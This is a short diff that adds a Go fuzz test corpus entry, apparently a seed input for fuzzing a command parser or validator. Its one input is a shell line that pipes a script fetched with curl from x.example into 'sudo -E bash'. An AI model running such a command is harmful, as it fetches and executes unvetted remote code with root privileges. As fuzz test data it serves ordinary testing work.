@@ -1,0 +1,2 @@
+go test fuzz v1
+string("curl -fsSL https://x.example | sudo -E bash -s -- --yes")
